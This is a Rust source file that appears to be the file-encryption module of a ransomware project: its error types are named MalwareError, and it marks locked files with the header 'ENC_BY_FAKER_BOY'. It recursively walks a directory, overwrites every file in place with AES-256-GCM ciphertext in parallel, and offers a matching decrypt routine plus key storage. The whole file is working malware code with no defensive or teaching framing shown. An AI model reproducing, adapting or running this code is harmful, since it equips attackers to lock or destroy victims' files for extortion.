use std::{
    fs::{self, File},
    io::{Read, Write},
    path::Path,
    sync::Mutex,
};

use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm,
    Key, // Or `Aes128Gcm`
    Nonce,
};
use rayon::iter::{IntoParallelRefIterator, IntoParallelRefMutIterator, ParallelIterator};
use walkdir::{DirEntry, WalkDir};

use crate::{MalwareError, MalwareResult};

const ENCRYPTED_HEADER: &[u8] = b"ENC_BY_FAKER_BOY:";

pub fn crypter_files(
    key: [u8; 32],
    dir_start: Option<&Path>,
    encrypt: bool,
) -> MalwareResult<Vec<String>> {
    let mut files_operated = Mutex::new(Vec::new());

    if let Some(dir) = dir_start {
        let files: Vec<_> = WalkDir::new(dir)
            .into_iter()
            .filter_map(|ent| ent.ok())
            .filter(|ent| ent.file_type().is_file())
            .collect();

        files.par_iter().for_each(|file| {
            if encrypt {
                let _ = encrypt_file(&file, key);
            } else {
                let _ = decrypt_file(&file, key);
            }
            let file_name = file.path().to_str().unwrap_or("unknown").to_string();
            files_operated.lock().unwrap().push(file_name);
        });
    }
    Ok(files_operated.into_inner().unwrap())
}

pub fn fetch_key(path: Option<&Path>, key_str: Option<&str>) -> MalwareResult<[u8; 32]> {
    if let Some(key_str) = key_str {
        let key_bytes = key_str.as_bytes();
        let mut key = [0u8; 32];

        if key_bytes.len() >= 32 {
            key.copy_from_slice(&key_bytes[..32]);
        } else {
            key[..key_bytes.len()].copy_from_slice(key_bytes);
        }

        if let Some(path) = path {
            if let Some(parent) = path.parent() {
                // Cria o diretório se ele não existir
                fs::create_dir_all(parent).map_err(|_err| MalwareError::File(_err.to_string()))?;
            }
            let mut file =
                File::create(path).map_err(|_err| MalwareError::File(_err.to_string()))?;
            file.write_all(&key)
                .map_err(|_err| MalwareError::File(_err.to_string()))?;
        }

        Ok(key)
    } else if let Some(path) = path {
        let mut file = File::open(path).map_err(|_err| MalwareError::File(_err.to_string()))?;
        let mut key = [0u8; 32];
        file.read_exact(&mut key)
            .map_err(|_err| MalwareError::File(_err.to_string()))?;
        Ok(key)
    } else {
        panic!("Key or path must be provided");
    }
}

pub fn encrypt_file(file: &DirEntry, key: [u8; 32]) -> MalwareResult<()> {
    let key = Key::<Aes256Gcm>::from_slice(&key);
    let cipher = Aes256Gcm::new(&key);
    // Unique nonce for file
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    // read file
    let file_path = file.path();
    let plain_text = fs::read(file_path).map_err(|_err| MalwareError::File(_err.to_string()))?;

    // check if file is already encrypted
    if plain_text.starts_with(ENCRYPTED_HEADER) {
        return Err(MalwareError::Encrypt(format!(
            "File {} already encrypted",
            file_path.display()
        )))?;
    }

    // encrypt content
    let cipher_text = cipher
        .encrypt(&nonce, plain_text.as_ref())
        .map_err(|_err| MalwareError::Encrypt(_err.to_string()))?;
    // write encrypted content to file
    let mut encrypted_file =
        File::create(file_path).map_err(|_err| MalwareError::File(_err.to_string()))?;
    // write header
    encrypted_file
        .write_all(ENCRYPTED_HEADER)
        .map_err(|_err| MalwareError::Encrypt(_err.to_string()))?;
    // write nonce and cipher text
    encrypted_file
        .write_all(&nonce)
        .map_err(|_err| MalwareError::File(_err.to_string()))?;
    encrypted_file
        .write_all(&cipher_text)
        .map_err(|_err| MalwareError::File(_err.to_string()))?;

    Ok(())
}

pub fn decrypt_file(file: &DirEntry, key: [u8; 32]) -> MalwareResult<()> {
    let key = Key::<Aes256Gcm>::from_slice(&key);
    let cipher = Aes256Gcm::new(&key);
    // read file
    let file_path = file.path();
    let mut encrypted_file =
        fs::File::open(file_path).map_err(|_err| MalwareError::File(_err.to_string()))?;
    
    // check if file is encrypted
    let mut header = [0u8; ENCRYPTED_HEADER.len()];
    encrypted_file
        .read_exact(&mut header)
        .map_err(|_err| MalwareError::File(_err.to_string()))?;
    if header != ENCRYPTED_HEADER {
        return Err(MalwareError::Decrypt(format!(
            "File {} is not encrypted",
            file_path.display()
        )))?;
    }
    
    // get nonce from file
    let mut nonce = [0u8; 12];

    encrypted_file
        .read_exact(&mut nonce)
        .map_err(|_err| MalwareError::File(_err.to_string()))?;

    // read encrypted content
    let mut cipher_text = Vec::new();
    encrypted_file

        .read_to_end(&mut cipher_text)
        .map_err(|_err| MalwareError::File(_err.to_string()))?;

    // decrypt content
    let plain_text = cipher
        .decrypt(&Nonce::from_slice(&nonce), cipher_text.as_ref())
        .map_err(|_err| MalwareError::Decrypt(_err.to_string()))?;
    // write decrypted content to file
    let mut decrypted_file =
        File::create(file_path).map_err(|_err| MalwareError::File(_err.to_string()))?;
    decrypted_file
        .write_all(&plain_text)
        .map_err(|_err| MalwareError::File(_err.to_string()))?;

    Ok(())
}
